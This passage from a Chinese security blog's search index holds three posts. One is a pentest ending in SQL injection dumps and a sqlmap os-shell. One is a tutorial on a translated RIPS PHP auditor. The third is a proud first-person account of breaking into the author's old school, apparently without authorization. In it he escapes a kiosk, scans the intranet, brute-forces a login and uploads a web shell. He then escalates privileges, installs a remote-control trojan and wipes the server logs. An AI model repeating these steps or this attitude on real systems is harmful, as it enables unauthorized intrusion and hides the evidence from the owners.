&quot;net_admin_user&quot; -D &quot;nd_net&quot; --threads=10   //导出net_admin_user表中id,nd_user,userid,nd_pass几个字段的数据</code><br><img src="https://s2.loli.net/2023/04/19/oRmSxVl5zUELvXQ.png" alt="image"></p><p>全部是md5加密，拿到cmd5，一波解密，成功获取到所有管理员的账号密码，然后成功登陆以管理员的权限登陆后台<br><img src="https://s2.loli.net/2023/04/19/wuAtjc89YFPogmb.png" alt="image"></p><p>哈哈，讲究！</p><h2 id="四、不拿Shell，与咸鱼有什么区别？"><a href="#四、不拿Shell，与咸鱼有什么区别？" class="headerlink" title="四、不拿Shell，与咸鱼有什么区别？"></a>四、不拿Shell，与咸鱼有什么区别？</h2><p>emm，就算是管理员的权限。我发现可以利用的地方依然很少，只有一些静态页面的编辑权限（而且编辑器是KindEditor，没什么方法上传拿Shell）,我当时十分绝望。。。但是我发现了这个——数据库备份<br><img src="https://s2.loli.net/2023/04/19/NgsyjOKr9BChRux.png" alt="image"></p><p>点击后，跳转到一款叫做“帝国备份王”的程序<br><img src="https://s2.loli.net/2023/04/19/ceJI6Q2SZquURYj.png" alt="image"></p><p>随后，我便去该程序的官网，下载了一个帮助文档。使用默认用户admin&#x2F;123456进行登陆，但是以失败告终。<br>但我怎末可能放弃，我一个一个测试了之前后台SQL注入得到的密码，最终在一个密码上成功地登陆了。。。</p><p>我靠，高兴死我。。。。。。。。<br><img src="https://s2.loli.net/2023/04/19/GIDgkBHJC7LNl3t.png" alt="image"></p><p>发现了一个PHP探针<br><img src="https://s2.loli.net/2023/04/19/fLXW47QSDBhOxyZ.png" alt="image"></p><p>再掏出SQLMAP，直接使用命令 用之前的注入点获取shell</p><p>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt –os-shell<br><img src="https://s2.loli.net/2023/04/19/ORNjiFl4C6t1MTh.png" alt="image"></p><p>输入我们通过探针得到的路径，很幸运，ROOT权限直接os-shell成功。直接上一句话，GetShell完美结束<br><img src="https://s2.loli.net/2023/04/19/NvHrg3s7CSXjh1n.png" alt="image"></p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>本次渗透测试，虽然没有骚操作，但是总体来说用到了许多知识，现进行总结<br>1.XSS盲打技术<br>2.SQLMAP注入HTTP响应包的语法<br>3.人性的弱点分析（多个程序用同一个管理密码）<br>4.从获取绝对路径到SQLMAP获取shell<br>5.审查元素小技巧</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计神器——RIPS个人汉化版</title>
      <link href="/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/"/>
      <url>/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、RIPS简介"><a href="#一、RIPS简介" class="headerlink" title="一、RIPS简介"></a>一、RIPS简介</h2><p>RIPS是一款PHP开发的开源的PHP代码审计工具，由国外的安全研究者Johannes Dahse开发，目前开源的最新版本是0.55。</p><p>程序小巧玲珑，仅有不到500kb，其中的PHP语法分析非常精准，可以实现跨文件变量和函数追踪，误报率较低。并有拥有简单易懂的用户界面，因此被许多安全研究人员钟爱，因此RIPS可谓是PHP代码审计之利器。</p><p>RIPS项目的官网为<a href="http://rips-scanner.sourceforge.net/">http://rips-scanner.sourceforge.net/</a><br>和 <a href="https://www.ripstech.com/">https://www.ripstech.com/</a><br>大家如果有兴趣可以自行了解</p><p>目前RIPS的免费开源版本已停止了程序更新，但官方目前给出了下个版本的说明<br><img src="https://s2.loli.net/2023/04/19/5BEldw4iNJIxtfO.png" alt="image"><br>简而言之就是官方想对程序的扫描精度，功能上进行了更进一步地拓展和升级，但神秘的作者也并没有告知我们下个版本的推送日期，所以我这次带来的是个人汉化版的RIPS—0.55版本。</p><p>个人汉化后的如图所示<br><img src="https://s2.loli.net/2023/04/19/DfkxF5wWYjMIv97.png" alt="image"><br><img src="https://s2.loli.net/2023/04/19/5BEldw4iNJIxtfO.png" alt="image"><br>部分地方汉化不全，还请各位大佬们海涵<br>下载地址见文末</p><h2 id="二、RIPS安装环境"><a href="#二、RIPS安装环境" class="headerlink" title="二、RIPS安装环境"></a>二、RIPS安装环境</h2><p>RIPS是基于PHP进行编写的，那么成功地运行RIPS便一定需要PHP环境的支持，在此我比较推荐使用PHPStudy这款程序来进行本地PHP环境安全<br>PHPstudy下载链接:<a href="http://phpstudy.php.cn/">http://phpstudy.php.cn/</a><br>安装后界面如图所示:<br><img src="https://s2.loli.net/2023/04/19/E9Hm2B6nMwUdrst.png" alt="image"></p><p>下载RIPS后将其解压放入PHPstduy的根目录下即可使用（无需进行任何数据库配置）<br><img src="https://s2.loli.net/2023/04/19/FkCg9BeUAzVDcJu.png" alt="image"></p><p>如图为RIPS安装成功后的界面<br><img src="https://s2.loli.net/2023/04/19/1qeawEB4OxmRr2c.png" alt="image"></p><h2 id="三、RIPS使用方法"><a href="#三、RIPS使用方法" class="headerlink" title="三、RIPS使用方法"></a>三、RIPS使用方法</h2><p>在程序的顶部”源码的绝对路径”文本框中输入你想要扫描的项目的绝对路径(如F:&#x2F;&#x2F;person&#x2F;phpstduy&#x2F;WWW&#x2F;dedecms)<br>然后根据个人的需求来选择扫描漏洞的范围，是否扫描根目录等，最后点击扫描即可。<br><img src="https://s2.loli.net/2023/04/19/ZIVGoWAEaQj6zHx.png" alt="image"><br><img src="https://s2.loli.net/2023/04/19/5iNsH2lgMS7ZAhw.png" alt="image"></p><p>扫描后即可查看扫描报告<br><img src="https://s2.loli.net/2023/04/19/HqVcEukiFl9zpwY.png" alt="image"></p><h2 id="四、RIPS审计实例"><a href="#四、RIPS审计实例" class="headerlink" title="四、RIPS审计实例"></a>四、RIPS审计实例</h2><p>我们先以笔者多年前刚刚学PHP时写的垃圾程序开一下刀(拿老裤写的，你懂得)<br><img src="https://s2.loli.net/2023/04/19/tkVbpl9LaFjZQUm.png" alt="image"></p><p>扫描后结果如图<br><img src="https://s2.loli.net/2023/04/19/56mHoitakzhPpQ8.png" alt="image"></p><p>可以看到存在XSS、文件读取、PHP代码执行、HTTP header注入等漏洞，我们选择XSS和文件读取漏洞来测试一下RIPS审计的准确性。</p><h3 id="①XSS漏洞处代码如下"><a href="#①XSS漏洞处代码如下" class="headerlink" title="①XSS漏洞处代码如下"></a>①XSS漏洞处代码如下</h3><pre><code class="php">echo &quot;-&gt;&lt;a href=\&quot;&#123;$_SERVER[&#39;PHP_SELF&#39;]&#125;?path=&quot; . _encode ($f[&#39;..&#39;]) . &quot;\&quot;&gt;上级目录      &lt;/a&gt; &quot;; $f = _opendir (_decode ($_GET[&#39;path&#39;]));  // elseif($_GET == null) else ,$f = _opendir (&#39;xiaojie&#39;);  // elseif($_GET == null),$f = _opendir (&#39;xiaojie&#39;);  // if($_GET == &#39;..&#39;)，</code></pre><p>可以看到该程序对f这个变量未进行过滤，直接将其输出，因此很可能存在XSS漏洞结合RIPS的漏洞说明可以知道XSS漏洞的成因及POC<br><img src="https://s2.loli.net/2023/04/19/yHn4dgwK9T6Mjir.png" alt="image"></p><p>我们来测试一下<br><img src="https://s2.loli.net/2023/04/19/ol3mVd7GHhz2baj.png" alt="image"></p><p>如图，我们成功地弹窗了。证明RIPS对该程序的XSS审计是很准确的。</p><h3 id="②任意文件读取处代码如下"><a href="#②任意文件读取处代码如下" class="headerlink" title="②任意文件读取处代码如下"></a>②任意文件读取处代码如下</h3><pre><code>echo echo &quot;-&gt;&lt;a href=\&quot;&#123;$_SERVER[&#39;PHP_SELF&#39;]&#125;?path=&quot; . _encode ($f[&#39;..&#39;]) . &quot;\&quot;&gt;上级目录      &lt;/a&gt; &quot;; $f = _opendir (_decode ($_GET[&#39;path&#39;]));  // elseif($_GET == null) else ,$f = _opendir (&#39;xiaojie&#39;);  // elseif($_GET == null),$f = _opendir (&#39;xiaojie&#39;);  // if($_GET == &#39;..&#39;),</code></pre><p>同样的，该程序未对data变量进行任何验证，直接使用file_get_contents读取文件内容<br><img src="https://s2.loli.net/2023/04/19/PsUZuoaTv5iSVJt.png" alt="image"></p><p>我们来读取一个host文件测试一下<br><img src="https://s2.loli.net/2023/04/19/nb7GANlTcWEBmsy.png" alt="image"></p><p>如图，我们成功读取到了host文件的内容</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>本篇文章介绍了国外安全研究人员开发的PHP代码审计神器——RIPS，并且提供了笔者的汉化版本，相信大家可以借助这款工具更好地进行代码审计，挖到更多CMS的漏洞。</p><h2 id="六、下载"><a href="#六、下载" class="headerlink" title="六、下载"></a>六、下载</h2><p><a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对母校终端机的一次渗透</title>
      <link href="/2017/06/17/%E5%AF%B9%E6%AF%8D%E6%A0%A1%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/"/>
      <url>/2017/06/17/%E5%AF%B9%E6%AF%8D%E6%A0%A1%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-一点感悟"><a href="#0x01-一点感悟" class="headerlink" title="0x01 一点感悟"></a>0x01 一点感悟</h2><p>又回到最初的起点 记忆中你青涩的脸</p><p>我们终于 来到了这一天                   —胡夏《那些年》</p><p>当这首歌的旋律在我耳边响起，我的思绪仿佛一下间重返多年前。<br>有些情思，难以抓住，我已变成如今的自己。<br>纵使很多故人难以重逢，生活难以重返，但是我依然坚信踏实地走好现在的路便是最好的选择。<br>朋友们，好好珍惜现在处在一起的友情、爱情，这些青葱岁月的小幸运可能会成为人生中最美的一缕记忆。</p><p>趁着母校的学生还在上课，老师们没放假，我想回到母校走走，看看那些花儿、那些草木和那些日日夜夜陪伴我的老师。<br>伴着发动机的轰鸣声，我来到了母校。</p><h2 id="0x02-本性难移"><a href="#0x02-本性难移" class="headerlink" title="0x02:本性难移"></a>0x02:本性难移</h2><p>走在这片熟悉的土地上，抚摸大地的每一寸肌肤，嗅着花儿的芬芳，感受着蓝天白云，远山沧海之美，不由得有些心潮澎湃<br>看着操场上奔跑的少年，校园里卿卿我我的学生。<br>“依然是那般单纯且美好~”我感叹到。<br>看了下手表，马上就要到和老师约定的时间了，我便快马加鞭地走向老师的办公室<br>但是途中发现了这个好东西。。。。我这技术菜鸡的禽兽本性就暴露无遗了。。<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407864.png" alt="image"></p><p>我去，学校现在真的是发达了，学校里都装上这种查询用的触屏终端机了。<br>我好奇地点开各个栏目。。浏览了一下学校的各种新闻（由于终端机屏幕亮，这些照片反光比较厉害）<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407936.png" alt="image"></p><p>不得不为母校的日益辉煌感到高兴啊，终端机里的新闻都挺牛逼。<br>但是我点击左上方的LOGO时，惊奇的发现了这个<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407512.png" alt="image"></p><p>没错404界面，说明我们应该进入了浏览器，那么我们思路可以骚一点，利用浏览器的审查元素来实现输入法工具栏的弹出<br>当我们在404界面手指长摁屏幕时，相当于使用鼠标右键<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191406618.png" alt="image-20230419132352843"></p><p>我们立马点开审查元素，找到一个可以输入字符的地方，召唤出我们亲爱的输入法<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191408853.png" alt="image"></p><p>搜狗输入法。。。可以很强势，点击搜狗输入法的工具栏，成功弹出Windows系统下方的工具栏<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191408786.png" alt="image"></p><p>然后利用搜狗的软键盘和下方的Windows工具栏，我们成功地打开cmd进行了一波信息搜集，这台终端机也宣布gg<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410094.png" alt="image"></p><p>没错，就这样把这台终端机给拿下了，我带着满心欢喜，上楼去找班主任的办公室。</p><h2 id="0x03-唠嗑后的Getshell"><a href="#0x03-唠嗑后的Getshell" class="headerlink" title="0x03:唠嗑后的Getshell"></a>0x03:唠嗑后的Getshell</h2><p>来到班主任的办公室里，班主任非常亲切地招待了我一番，颇有一番活跃的气氛<br>过了一会，班主任说她要上课了，我决定等她下班后和她吃顿饭。于是她把我安排在她办公室的座位上跟我说<br>——“你在这里拿我的电脑看看网页吧，我上完课和你一块出去哈”</p><p>这一句话可算是高兴坏了我，这简直是引狼入室啊。。。于是我拿出U盘，开始对学校内网进行进一步的探测。</p><p>首先使用ScanPort对192段内网开放的WEB服务进行了扫描</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410608.png" alt="image"></p><p>我看了一下，有些是路由器的管理界面，尝试了一些弱口令爆破无果后便放弃了<br>但是我发现了学校的一个校内直播平台 192.168.88.128:80</p><p>2.打开直播平台后，发现每次直播的发起人的用户名均是admin….运气好炸<br>用户登录界面没有验证码，果断进行一波猛如虎的爆破。。（忘截图了）</p><p>成功登录后台，找到一个LOGO的上传点上传SHELL<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410789.png" alt="image"></p><p>很明显。。。拦截掉了，但是目测肯定是用的前端认证。<br>直接在Burp的Http请求中修改shell.jpg为shell.php</p><p>如图所示<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410915.png" alt="image"></p><p>成功拿到SHELL<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410865.png" alt="image"></p><h2 id="0x04-蛋疼的提权"><a href="#0x04-蛋疼的提权" class="headerlink" title="0x04:蛋疼的提权"></a>0x04:蛋疼的提权</h2><p>whoami执行看了一下，权限比较小，没有c盘的写权限(所以shift后门还是算了)。<br>于是我上了一堆ms提权集试了下，发现补丁打的还算是及时，都没什么卵用。。。<br>后来翻了翻数据库配置文件，拿到了数据库的相关配置信息<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411392.png" alt="image"></p><p>UDF提权试下<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411538.png" alt="image"></p><p>OKOK，非常可以，直接上用户，使用默认3389端口登录服务器<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411845.png" alt="image"></p><h2 id="0x05-收尾"><a href="#0x05-收尾" class="headerlink" title="0x05:收尾"></a>0x05:收尾</h2><p>拿到服务器后，我在网站根目录写了一个PHP的文件下载系统，然后在服务器上架设好远控，跑到楼下的终端机上下载了远控木马执行<br>这样操作就更加方便了。正当我准备进行进一步嗅探时，我看了看时间已经不早了。。老师马上要下课了。。</p><p>于是我使用工具清理了一下服务器日志，删除了shell，拿QQ音乐放上一首老男孩，静静地听着。<br>随后老师回来了，我们愉快的离开校园，我叫上一个基友一块到万达吃了顿饭，感觉还不错<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411549.png" alt="image"></p><h2 id="0x06-想法与总结"><a href="#0x06-想法与总结" class="headerlink" title="0x06:想法与总结"></a>0x06:想法与总结</h2><p>当我离开校园时，我静静地回首望向一座座教学楼——那是我梦想开始的地方。<br>时至今日我已不记得多少个无助的夜里面，我听着那首《老男孩》，然后在宿舍里开着手电筒背书，学技术<br>我也不需要记得。</p><p>下面说一下终端机的常用渗透测试技巧:</p><blockquote><p>1.在终端机输入内容时，注意是否出现语言栏，很多情况可以利用语言栏进行渗透<br>2.可以频繁点击屏幕，程序有可能崩溃掉（不要笑，这是真的）<br>3.利用长摁某一位置出现的右键菜单（比如本篇文章中浏览器中的审查元素）<br>4.如果可以接触到终端机的电源，可以电源，然后让终端机重启，往往会有意想不到的结果</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 硬件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
